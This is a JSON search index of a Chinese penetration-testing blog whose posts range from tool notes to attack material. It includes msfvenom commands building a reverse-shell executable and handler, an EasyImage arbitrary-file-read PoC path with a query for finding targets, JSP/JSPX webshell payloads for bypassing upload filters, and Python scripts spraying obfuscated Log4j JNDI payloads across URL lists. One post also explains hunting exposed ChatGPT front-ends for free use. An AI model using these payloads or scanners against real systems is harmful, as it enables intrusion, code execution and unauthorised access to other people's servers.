{"meta":{"title":"这里有一个网站","subtitle":"一个不怎么安全的网站","description":"web安全","author":"ccadmin","url":"https://blog.njcit.me","root":"/"},"pages":[{"title":"关于我","date":"2022-12-29T06:12:17.000Z","updated":"2023-01-08T13:21:25.476Z","comments":false,"path":"about/index.html","permalink":"https://blog.njcit.me/about/index.html","excerpt":"","text":"博主主要方向是渗透测试，蓝队红队都会一点，刷机小能手。 寡妇王的痛恨者，教主的疯狂粉丝。 frida的忠实拥趸，GitHub永远的神。"},{"title":"categories","date":"2022-12-29T06:21:53.000Z","updated":"2022-12-29T06:22:18.496Z","comments":false,"path":"categories/index.html","permalink":"https://blog.njcit.me/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2022-12-29T06:23:09.000Z","updated":"2022-12-29T06:23:27.928Z","comments":false,"path":"tags/index.html","permalink":"https://blog.njcit.me/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"MySQL手动注入笔记","slug":"渗透记录/MySQL手动注入笔记","date":"2023-06-29T06:34:54.000Z","updated":"2023-06-29T01:09:15.404Z","comments":true,"path":"2023/06/29/渗透记录/MySQL手动注入笔记/","link":"","permalink":"https://blog.njcit.me/2023/06/29/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/MySQL%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/","excerpt":"","text":"前言 大部分情况下都能sqlmap一把梭，当然也有不能一把梭的地方这时候就需要手动进行注入了。 基础 获取当前用户 1select user() 查询当前版本 1select @@version 查询当前数据库 1select database() 查询当前用户权限下的所有数据库 1select schema_name from information_schema.schemata 已知数据库名查询表名 1select table_name from information_schema.tables where table_schema=database() 查询字段名 1select column_name from information_schema.columns where table_name=&#x27;users&#x27;","categories":[],"tags":[{"name":"注入, MySQL","slug":"注入-MySQL","permalink":"https://blog.njcit.me/tags/%E6%B3%A8%E5%85%A5-MySQL/"}]},{"title":"dirsearch使用","slug":"渗透工具/dirsearch使用","date":"2023-06-12T00:51:30.000Z","updated":"2023-06-21T09:04:25.314Z","comments":true,"path":"2023/06/12/渗透工具/dirsearch使用/","link":"","permalink":"https://blog.njcit.me/2023/06/12/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/dirsearch%E4%BD%BF%E7%94%A8/","excerpt":"","text":"前言 渗透无非就是三板斧，扫目录，漏扫，弱口令，第一步当然要扫描目录，很早之前扫目录大家用的都是御剑，御剑太老了，而且扫描速率太快得得容易闪退，扫扫一些比较老得asp/aspx得站还可以，新的Java架构得网站就不得行了，字典也不得行，有新的专业扫描得工具https://github.com/maurosoria/dirsearch为何不用呢 使用 安装 123git clone https://github.com/maurosoria/dirsearch.git --depth 1cd dirsearchpip3 install -r requirements.txt 如果pip安装版本冲突之类得，就把requirements.txt中的版本号去掉即可 使用 12python3 dirsearch.py -u https://targetpython3 dirsearch.py -e php,html,js -u https://target 1python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist 参考文档 https://github.com/maurosoria/dirsearch/tree/master","categories":[],"tags":[{"name":"dirsearch","slug":"dirsearch","permalink":"https://blog.njcit.me/tags/dirsearch/"}]},{"title":"hexo博客调优","slug":"杂项/hexo博客调优","date":"2023-06-09T00:55:19.000Z","updated":"2023-06-09T01:03:50.959Z","comments":true,"path":"2023/06/09/杂项/hexo博客调优/","link":"","permalink":"https://blog.njcit.me/2023/06/09/%E6%9D%82%E9%A1%B9/hexo%E5%8D%9A%E5%AE%A2%E8%B0%83%E4%BC%98/","excerpt":"","text":"解决某些机场屏蔽22端口的问题 修改.ssh/config如下： 1234Host github.com Hostname ssh.github.com Port 443 User git 解决hexo默认渲染引擎导致单引号显示不正确的问题 123sudo apt install pandocnpm uninstall hexo-renderer-marked --savenpm install hexo-renderer-pandoc --save 编辑 主题配置文件，修改配置如下： 12345678910# Math Equations Render Supportmath: enable: true # Default (true) will load mathjax / katex script on demand. # That is it only render those page which has `mathjax: true` in Front Matter. # If you set it to false, it will load mathjax / katex srcipt EVERY PAGE. per_page: false engine: mathjax 引号测试 1&#x27;&quot;&quot;&#x27; 参考链接 https://github.com/hexojs/hexo-renderer-pandoc https://battlele.com/blog-2/ https://www.wylu.me/posts/78c745f0/","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://blog.njcit.me/tags/hexo/"},{"name":"优化","slug":"优化","permalink":"https://blog.njcit.me/tags/%E4%BC%98%E5%8C%96/"}]},{"title":"john爆破zip密码","slug":"CTF/john爆破zip密码","date":"2023-06-08T08:20:07.000Z","updated":"2023-06-21T08:13:00.029Z","comments":true,"path":"2023/06/08/CTF/john爆破zip密码/","link":"","permalink":"https://blog.njcit.me/2023/06/08/CTF/john%E7%88%86%E7%A0%B4zip%E5%AF%86%E7%A0%81/","excerpt":"","text":"使用教程 注意，fish可能报错，建议zsh或者bash 123zip2john flag.zip &gt; hash.txtcat hash.txtjohn --format=pkzip --mask=?d?d?d hash.txt john理论上是支持字典的（未实测） 1john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1 crack.txt 参考链接 https://www.freecodecamp.org/news/crack-passwords-using-john-the-ripper-pentesting-tutorial/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://blog.njcit.me/tags/ctf/"},{"name":"爆破","slug":"爆破","permalink":"https://blog.njcit.me/tags/%E7%88%86%E7%A0%B4/"}]},{"title":"gobuster工具使用","slug":"渗透工具/gobuster工具使用","date":"2023-06-08T07:12:21.000Z","updated":"2023-06-08T07:26:07.511Z","comments":true,"path":"2023/06/08/渗透工具/gobuster工具使用/","link":"","permalink":"https://blog.njcit.me/2023/06/08/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/gobuster%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/","excerpt":"","text":"工具下载 kali 1sudo apt install gobuster other os https://github.com/OJ/gobuster 基础使用 爆破dns,字典链接：https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt 1gobuster dns -d baidu.com -t 50 -w /mnt/14T/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 爆破目录,字典链接：https://github.com/SexyBeast233/SecDictionary 1gobuster dir -u &quot;http://www.xxxx.com/&quot; -w D:\\pentest\\dict\\js.txt -k D:\\tools\\dicts\\SecDictionary\\filelak\\H2-9000.txt 其他使用见官方readme","categories":[],"tags":[{"name":"gobuster","slug":"gobuster","permalink":"https://blog.njcit.me/tags/gobuster/"},{"name":"工具","slug":"工具","permalink":"https://blog.njcit.me/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"安卓渗透测试环境准备","slug":"渗透工具/安卓渗透测试环境准备","date":"2023-06-05T00:37:33.000Z","updated":"2023-06-09T01:27:53.837Z","comments":true,"path":"2023/06/05/渗透工具/安卓渗透测试环境准备/","link":"","permalink":"https://blog.njcit.me/2023/06/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/","excerpt":"","text":"前言 用公司的经费买了部pixel 3，","categories":[],"tags":[{"name":"刷机","slug":"刷机","permalink":"https://blog.njcit.me/tags/%E5%88%B7%E6%9C%BA/"},{"name":"移动安全","slug":"移动安全","permalink":"https://blog.njcit.me/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"}]},{"title":"渗透测试中jwt的应用","slug":"渗透记录/渗透测试中jwt的应用","date":"2023-05-31T02:21:24.000Z","updated":"2023-05-31T02:58:20.522Z","comments":true,"path":"2023/05/31/渗透记录/渗透测试中jwt的应用/","link":"","permalink":"https://blog.njcit.me/2023/05/31/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%ADjwt%E7%9A%84%E5%BA%94%E7%94%A8/","excerpt":"","text":"什么是jwt JSON Web Token (JWT，RFC 7519 (opens new window))，是为了在网络应用环境间传递声明而执行的一种基于 JSON 的开放标准（(RFC 7519)。该 token 被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT 的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该 token 也可直接被用于认证，也可被加密。 常用工具 https://github.com/brendan-rius/c-jwt-cracker image-20230531103017918 https://github.com/ticarpi/jwt_tool/ image-20230531103044012 image-20230531103137446 参考文章 https://www.anquanke.com/post/id/225947","categories":[],"tags":[{"name":"jwt","slug":"jwt","permalink":"https://blog.njcit.me/tags/jwt/"}]},{"title":"hacktricks","slug":"渗透记录/hacktricks","date":"2023-05-30T06:34:54.000Z","updated":"2023-05-30T06:50:37.556Z","comments":true,"path":"2023/05/30/渗透记录/hacktricks/","link":"","permalink":"https://blog.njcit.me/2023/05/30/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/hacktricks/","excerpt":"","text":"https://book.hacktricks.xyz/ image-20230530143543520 https://www.ired.team/ image-20230530143758740 https://pentester.land/ image-20230530144234475 https://github.com/reddelexc/hackerone-reports/blob/master/tops_100/TOP100PAID.md image-20230530144809964 https://offsec.tools/ image-20230530145032272","categories":[],"tags":[{"name":"tricks","slug":"tricks","permalink":"https://blog.njcit.me/tags/tricks/"}]},{"title":"书签分享","slug":"杂项/书签","date":"2023-05-29T08:12:24.000Z","updated":"2023-07-11T06:45:26.490Z","comments":true,"path":"2023/05/29/杂项/书签/","link":"","permalink":"https://blog.njcit.me/2023/05/29/%E6%9D%82%E9%A1%B9/%E4%B9%A6%E7%AD%BE/","excerpt":"","text":"信安资讯 安全文摘 - 『代码审计』知识星球 Paper 安全客 - 有思想的安全新媒体 先知社区 FreeBuf互联网安全新媒体平台 | 关注黑客与极客 看雪安全论坛 技术文章的最新主题 - 90Sec 暗月知识中心 SecIN信息安全技术社区 青衣十三楼 Hacking8 安全信息流 跳跳糖 洞见微信聚合-安全圈微信搜索_订阅号及文章内容收录,一搜即达 渗透师 网络安全从业者安全导航 安全文章 实用FRIDA进阶：内存漫游、hook anywhere、抓包 - 安全客，安全资讯平台 # CTF Getting Started - CTF Wiki PHP: PHP 手册 - Manual 主页 | NSSCTF # 文档 C 语言简介 - C 语言教程 - 网道 Linux-setup - notebook Go语言创世纪 - Go语言高级编程 strings — 字符串操作 · Go语言标准库 Web安全学习笔记 — Web安全学习笔记 1.0 文档 说明 · Neilpang/acme.sh Wiki CTFtime.org / All about CTF (Capture The Flag) hongriSec/PHP-Audit-Labs: 一个关于PHP的代码审计项目 一、前言 · Web Hacking 101 中文版 1.1 SQL注入漏洞 - secskill 前言 - Docker —— 从入门到实践 Red Teaming Experiments 狼组安全团队公开知识库 白阁文库 备忘录 - 像黑客一样学习 关于文库 · PeiQi WiKi文库 安全知识WIKI Qingy 漏洞库 Wiki 1.5.2 任意文件读取/包含/删除 - 漏洞知识库 漏洞知识库 1.1 SQL注入漏洞 - 漏洞知识库 # 网络空间搜索 网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统 ZoomEye - Cyberspace Search Engine 360网络空间资产测绘 Shodan Censys 鹰图平台 crt.sh | Certificate Search RiskIQ Community # 加解密 AES decryption AES encryption AES Hex Key Supported - The X Online Tools MD5免费在线解密破解_MD5在线加密-SOMD5 Objectif Sécurité - Ophcrack Md5 Encryption &amp; Decryption Gratuite - Plus de 10.000.000.000 hashs # 云查杀 WEBDIR+ - WebShell 扫描服务 - OpenRASP 团队 微步在线云沙箱 VirSCAN.org-多引擎在线病毒扫描网 v1.02，当前支持 41 款杀毒引擎 VirusTotal - Home 腾讯哈勃分析系统 CT Stack 安全社区 云悉WEB资产梳理|在线CMS指纹识别平台 - 云悉安全 在线工具 - 程序员的工具箱 CEYE - Monitor service for security testing Java decompiler online 域名查ip 域名解析 ip查询网站 ip反查域名 ip反查网站 同一ip网站 同ip网站域名ip查询 提权辅助网页 CTF.GS_CTF网址导航_CTF练习平台收集 Online regex tester and debugger: PHP, PCRE, Python, Golang and JavaScript CVE security vulnerability database. Security vulnerabilities, exploits, references and more nip.io - wildcard DNS for any IP Address Exploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers Subdomain Finder XSS平台 - （支持http/https）XSS Platform TideFinger 潮汐指纹 Subdomain - RapidDNS Rapid DNS Information Collection The World's Largest Repository of Historical DNS data java.lang.Runtime.exec() Payload Workarounds - @Jackson_T Same IP Website - RapidDNS Rapid DNS Information Collection https://www.osint-labs.org/tools/ Online - Reverse Shell Generator Y4er的博客 Managed Cloud Hosting, Dedicated Servers, Cloud Services - CloudCone DNSLog管理 # 技巧 IPv6地址查询网站 V2EX https://toi.teracloud.jp/ Greasy Fork - 安全、实用的用户脚本大全 临时邮箱、十分钟邮箱（10分钟)、临时邮、临时Email、快速注册Email、24Mail--查错网 Bandwagon Host - Client Area Account Summary 内核恐慌 Image Upload - SM.MS - Simple Free Image Hosting Login - ProtonMail OrangeFox Recovery Downloads","categories":[],"tags":[{"name":"书签","slug":"书签","permalink":"https://blog.njcit.me/tags/%E4%B9%A6%E7%AD%BE/"}]},{"title":"Linux配置速查","slug":"杂项/Linux配置速查","date":"2023-05-24T01:49:27.000Z","updated":"2023-05-24T02:13:28.295Z","comments":true,"path":"2023/05/24/杂项/Linux配置速查/","link":"","permalink":"https://blog.njcit.me/2023/05/24/%E6%9D%82%E9%A1%B9/Linux%E9%85%8D%E7%BD%AE%E9%80%9F%E6%9F%A5/","excerpt":"","text":"0x00 好多配置记不住，每次都要Google去查一下，不如记下来，省的下次再去查。 0x01 Linux下配置path 修改/etc/profile文件，修改找个文件是全局生效，不受bash/zsh影响 1export PATH=&quot;$HOME/bin:$PATH&quot; fish修改环境变量: 打开你的 fish 配置文件： 1nano ~/.config/fish/config.fish 在文件的末尾，添加你的 set 命令： 123set -gx MY_VARIABLE &quot;my value&quot; set -gx PATH &quot;$PATH:/home/ccadmin/go/bin&quot; set -gx PATH &quot;$PATH:/home/ccadmin/.local/bin&quot; 按 Ctrl+O 保存文件，然后按 Ctrl+X 退出 nano。 这样，无论你何时启动一个新的 fish session，MY_VARIABLE 环境变量就会自动设置为 \"my value\"。 image-20230524101310931 image-20230524101327195 0x0n 参考链接 https://www.cnblogs.com/amboyna/archive/2008/03/08/1096024.html","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.njcit.me/tags/Linux/"}]},{"title":"metasploit使用笔记","slug":"渗透工具/metasploit使用笔记","date":"2023-05-16T02:12:24.000Z","updated":"2023-05-17T01:36:35.877Z","comments":true,"path":"2023/05/16/渗透工具/metasploit使用笔记/","link":"","permalink":"https://blog.njcit.me/2023/05/16/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/metasploit%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/","excerpt":"","text":"0x00 Linux安装 1curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall 0x01 查看metasploit 所有的payload 1msfvenom -l payloads [payloads, encoders, nops, platforms, archs, encrypt, formats, all] 生成反弹metasploit会话的可执行文件 1msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=1.1.1.1 LPORT=24444 -f exe &gt; shell.exe 正向会话 1msfvenom -p windows/x64/meterpreter/bind_tcp lport=4444 -f raw -o msf1.bin 监听会话 123456msfconsoleuse exploit/multi/handlerset PAYLOAD windows/x64/meterpreter_reverse_tcpset LHOST 0.0.0.0set LPORT 24444exploit 查看编码器 1msfvenom -l encoders","categories":[],"tags":[{"name":"metasploit","slug":"metasploit","permalink":"https://blog.njcit.me/tags/metasploit/"},{"name":"shell","slug":"shell","permalink":"https://blog.njcit.me/tags/shell/"}]},{"title":"简单图床任意文件读取","slug":"poc_exp/简单图床任意文件读取","date":"2023-05-15T07:07:51.000Z","updated":"2023-05-15T01:38:48.591Z","comments":true,"path":"2023/05/15/poc_exp/简单图床任意文件读取/","link":"","permalink":"https://blog.njcit.me/2023/05/15/poc_exp/%E7%AE%80%E5%8D%95%E5%9B%BE%E5%BA%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","excerpt":"","text":"quake语法 1app:&quot;EasyImage&quot; Poc 1/application/down.php?dw=./config/config.php image-20230515093845541","categories":[],"tags":[{"name":"exp","slug":"exp","permalink":"https://blog.njcit.me/tags/exp/"}]},{"title":"quake使用笔记","slug":"网络空间搜索/quake使用笔记","date":"2023-04-17T02:27:01.000Z","updated":"2023-06-19T02:39:19.756Z","comments":true,"path":"2023/04/17/网络空间搜索/quake使用笔记/","link":"","permalink":"https://blog.njcit.me/2023/04/17/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2/quake%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/","excerpt":"","text":"前言 国内搜索引擎越来越多，fofa,hunter，zoomeye，当然也包括quake，当初是看重他的漏洞库才开的会员，奈何不向普通会员开放，那要你有啥用，不过买都买了，不如就了解如何去正常如使用他。 搜索语法 官方的文档：https://quake.360.net/quake/#/help?id=5eb238f110d2e850d5c6aec8&amp;title=%E6%A3%80%E7%B4%A2%E5%85%B3%E9%94%AE%E8%AF%8D 先放一些官方文档可能没有的检索字段： is_domain:\"true\" 查询有域名的资产 type: \"蜜罐(honeypot)\" 查询quake判断是蜜罐的资产 其他语法示例 response:\"&lt;title&gt;系统&lt;/title&gt;\": 全匹配title,垃圾quake,不生效。 app:\"扫描黑洞\": 目标IP开放端口大于一个阈值，就会被标注为扫描黑洞 查询一些存在漏洞的语法 title:\"Index of /\"，这个语法会匹配到index,而且没办法使用not进行排除，建议使用全匹配。 image-20230417104830535 response:\"&amp;lt;dir&amp;gt;\" image-20230417105206092 quake特色 不开启排除蜜罐，蜜罐永远靠前，绝绝子 image-20230417104609245","categories":[],"tags":[{"name":"quake","slug":"quake","permalink":"https://blog.njcit.me/tags/quake/"},{"name":"网络空间搜索引擎","slug":"网络空间搜索引擎","permalink":"https://blog.njcit.me/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/"}]},{"title":"文件上传绕过waf姿势收集","slug":"waf_bypass/文件上传","date":"2023-03-23T01:27:44.000Z","updated":"2023-03-23T02:48:49.365Z","comments":true,"path":"2023/03/23/waf_bypass/文件上传/","link":"","permalink":"https://blog.njcit.me/2023/03/23/waf_bypass/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"","text":"前言 现在渗透测试基本都会遇到waf，有waf就会封ip，有waf就要fuzz,记录一下从网上收集到的常用的文件上传的姿势，不一定能用，说不定下次就遇到了呢。 正文 后缀绕过 白名单基本没戏，洗洗睡吧。记录一下遇到的黑名单绕过。 jsp 1.jpg\\.jsp/ 以下内容可以尝试换行试一下 filename='shell.jspx.jsp' filename=shell.jspx.jsp filename=shell.jspx.jsp' \"filename\"=shell.jspx; filename=shell.jpg;filename=shell.jspx; filename=shell.jspx;filename=shell.jpg; FileName=shell.jspx.jsp' FileName=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaashell.jspx.jsp' FileName =shell.jspx（加空格） filename====\"shell.jspx.jsp1\"（加等号） FileName =shell.jspx FileName=shell.jspx. jsp File Name=shell.jspx.jsp' 内容绕过 jsp利用EL表达式绕过 1$&#123;Runtime.getRuntime().exec(request.getParameter(&quot;x&quot;))&#125; jspx利用命名空间绕过:http://127.0.0.1:8080/test.jsp?ccadmin=whoami,其中bbb可以任意替换 12345&lt;bbb:root xmlns:bbb=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt; &lt;bbb:scriptlet&gt; Runtime.getRuntime().exec(request.getParameter(&quot;ccadmin&quot;)); &lt;/bbb:scriptlet&gt;&gt;&lt;/bbb:root&gt; jspx利用jsp:expression绕过 12345&lt;bbb:root xmlns:bbb=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt; &lt;bbb:expression&gt; Runtime.getRuntime().exec(request.getParameter(&quot;ccadmin&quot;))&lt;/bbb:expression&gt;&lt;/bbb:root&gt; 参考内容 https://xz.aliyun.com/t/10515 https://yzddmr6.com/posts/jsp-webshell-upload-bypass/","categories":[],"tags":[{"name":"waf","slug":"waf","permalink":"https://blog.njcit.me/tags/waf/"},{"name":"bypass","slug":"bypass","permalink":"https://blog.njcit.me/tags/bypass/"}]},{"title":"AI相关","slug":"杂项/AI相关","date":"2023-03-22T08:27:44.000Z","updated":"2023-04-23T01:04:53.318Z","comments":true,"path":"2023/03/22/杂项/AI相关/","link":"","permalink":"https://blog.njcit.me/2023/03/22/%E6%9D%82%E9%A1%B9/AI%E7%9B%B8%E5%85%B3/","excerpt":"","text":"链接 https://chat.openai.com/chat 貌似是通过udp判断IP，建议使用美国的IP image-20230322163014374 https://www.bing.com/new 国内要使用插件修改header,貌似dev不用 image-20230322170113101 https://bard.google.com/ image-20230423083633416 https://yiyan.baidu.com/welcome image-20230423083023088 https://tongyi.aliyun.com/ https://weibo.com/u/1727858283 https://slack.com/apps/A04KGS7N9A8-claude?selected_team_id=T03G6H0A6&amp;tab=more_info&amp;continueFlag=9bd5d9031215cfb669b8ae72708f7318 image-20230423090311349 https://open-assistant.io/zh/chat image-20230423090202435 # 白嫖 quake语法：title: \"ChatGPT Web\" https://quake.360.net/quake/#/searchResult?searchVal=title%3A%22chatgpt%22%20AND%20title%3A%20%22ChatGPT%20Web%22&amp;selectIndex=quake_service&amp;ignore_cache=false&amp;timeRange=&amp;timeRange=&amp;latest=true&amp;t=1679475514161 image-20230322165916603","categories":[],"tags":[{"name":"AI","slug":"AI","permalink":"https://blog.njcit.me/tags/AI/"}]},{"title":"反序列化学习资料","slug":"代码审计/反序列化漏洞学习资料","date":"2023-03-22T01:07:17.000Z","updated":"2023-03-22T08:19:20.963Z","comments":true,"path":"2023/03/22/代码审计/反序列化漏洞学习资料/","link":"","permalink":"https://blog.njcit.me/2023/03/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/","excerpt":"","text":"资料链接 Java安全漫谈：https://github.com/phith0n/JavaThings Java反序列化漏洞学习 Commons Collection：https://tttang.com/archive/1337/ 反序列化分析到shiro注入WebSocket内存马：https://xz.aliyun.com/t/12042 TemplatesImpl利用链与Fastjson注入内存马：https://xz.aliyun.com/t/12085 从0到1的fastjson的反序列化漏洞分析：https://xz.aliyun.com/t/12096","categories":[],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://blog.njcit.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"反序列化","slug":"反序列化","permalink":"https://blog.njcit.me/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"Linux基础命令","slug":"杂项/Linux基础命令","date":"2023-02-21T07:43:37.000Z","updated":"2023-02-21T08:24:24.017Z","comments":true,"path":"2023/02/21/杂项/Linux基础命令/","link":"","permalink":"https://blog.njcit.me/2023/02/21/%E6%9D%82%E9%A1%B9/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/","excerpt":"","text":"前言 好多命令平时用的少，经常忘，在此做一次记录。 正文 Ubuntu修改主机名 1sudo hostnamectl set-hostname ty Ubuntu修改SSH欢迎信息 修改/etc/update-motd.d/目录下面的文件即可，不行就重启一下 SSH密钥登录 把公钥放在.ssh/authorized_keys中即可 scp 指定端口：scp -P 2233 get_info.sh liemer@192.168.76.52:/usr/local/src 传输目录scp -r /opt/ liemer@192.168.76.52:/usr/local/src","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.njcit.me/tags/Linux/"}]},{"title":"scoop基础使用","slug":"杂项/scoop基础使用","date":"2023-02-19T10:06:47.000Z","updated":"2023-02-19T10:28:18.582Z","comments":true,"path":"2023/02/19/杂项/scoop基础使用/","link":"","permalink":"https://blog.njcit.me/2023/02/19/%E6%9D%82%E9%A1%B9/scoop%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/","excerpt":"","text":"前言 scoop是一个包管理软件，可以通过一条命令安装/更新卸载软件，scoop拥有大量软件，基本上常用的软件都在scoop里面能找到。 # 安装 ## 安装 建议使用pwsh和Windows终端 12Set-ExecutionPolicy RemoteSigned -Scope CurrentUserirm get.scoop.sh | iex ## 配置额外的bucket 查看bucket列表 123456789101112scoop bucket knownmainextrasversionsnirsoftsysinternalsphpnerd-fontsnonportablejavagames 添加bucket(要先安装git) 1scoop bucket add extras 查看本地的bucket列表 1scoop bucket list 修改安装位置,注意：已经安装的软件可能出现问题，建议重新安装。 1234$env:SCOOP=&#x27;D:\\Applications\\Scoop&#x27;[Environment]::SetEnvironmentVariable(&#x27;SCOOP&#x27;, $env:SCOOP, &#x27;User&#x27;)$env:SCOOP_GLOBAL=&#x27;F:\\GlobalScoopApps&#x27;[Environment]::SetEnvironmentVariable(&#x27;SCOOP_GLOBAL&#x27;, $env:SCOOP_GLOBAL, &#x27;Machine&#x27;) # 参考链接 - https://scoop.sh/","categories":[],"tags":[]},{"title":"漏洞扫描","slug":"华为行动/漏洞扫描","date":"2023-02-17T06:14:22.000Z","updated":"2023-03-22T08:07:23.338Z","comments":true,"path":"2023/02/17/华为行动/漏洞扫描/","link":"","permalink":"https://blog.njcit.me/2023/02/17/%E5%8D%8E%E4%B8%BA%E8%A1%8C%E5%8A%A8/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/","excerpt":"","text":"前言 一场比赛最重要的环节就是外网打点，外网没点进不了内网一切都白瞎，在我的印象中，这几年比较火的漏洞是shiro 550/springboot rce/log4j rce。第一时间肯定要先扫描提供的资产是不是存在上面的漏洞，快速打点。当然各大oa还财务系统也存在各种漏洞。 # 批量漏洞扫描 ## log4j fuzz spring 1234567891011121314151617181920212223import requestsimport api.read_fileimport urllib3import hashliburllib3.disable_warnings()q = b&#x27;icon_hash=&quot;116323821&quot; &amp;&amp; country=&quot;CN&quot;&#x27;# url_list = api.fofa_api.get_url(base64.b64encode(q), 4)url_list = api.read_file.get_url_list(&#x27;url.txt&#x27;)hl = hashlib.md5()for url in url_list: hl.update(url.encode(encoding=&#x27;utf-8&#x27;)) print(url + &#x27;\\t\\t&#x27; + hl.hexdigest()) dnslog = &#x27;dnslog&#x27; accept = &#x27;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;: $&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;:// &#x27; + hl.hexdigest()[0:5] + dnslog + &#x27;/poc&#125;&#x27; header = &#123; &#x27;Accept&#x27;: accept &#125; try: r = requests.get(url, headers=header, timeout=5, verify=False) except requests.exceptions.RequestException as e: print(&#x27;请求出现异常&#x27;) fuzz 全部header 123456789101112131415161718192021222324252627282930import requestsimport api.read_fileimport urllib3import hashliburllib3.disable_warnings()url_list = api.read_file.get_url_list(&#x27;url.txt&#x27;)hl = hashlib.md5()for url in url_list: hl.update(url.encode(encoding=&#x27;utf-8&#x27;)) print(url + &#x27;\\t\\t&#x27; + hl.hexdigest()) dnslog = &#x27;dnslog&#x27; poc = &#x27;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;: $&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;:// &#x27; + hl.hexdigest()[0:5] + dnslog + &#x27;/poc&#125;&#x27; header = &#123; &#x27;Accept&#x27;: &#x27;accept&#x27; + &#x27;.&#x27; + poc, &#x27;X-Client-IP&#x27;: &#x27;X-Client-IP&#x27; + &#x27;.&#x27; + poc, &#x27;X-Remote-IP&#x27;: &#x27;X-Remote-IP&#x27; + &#x27;.&#x27; + poc, &#x27;X-Remote-Addr&#x27;: &#x27;X-Remote-Addr&#x27; + &#x27;.&#x27; + poc, &#x27;X-Forwarded-For&#x27;: &#x27;X-Forwarded-For&#x27; + &#x27;.&#x27; + poc, &#x27;X-Originating-IP&#x27;: &#x27;X-Originating-IP&#x27; + &#x27;.&#x27; + poc, &#x27;User-Agent&#x27;: &#x27;User-Agent&#x27; + &#x27;.&#x27; + poc, &#x27;Referer&#x27;: &#x27;Referer&#x27; + &#x27;.&#x27; + poc, &#x27;Authorization&#x27;: &#x27;Authorization&#x27; + &#x27;.&#x27; + poc &#125; try: r = requests.get(url, headers=header, timeout=5, verify=False) except requests.exceptions.RequestException as e: print(&#x27;请求出现异常&#x27;) shiro 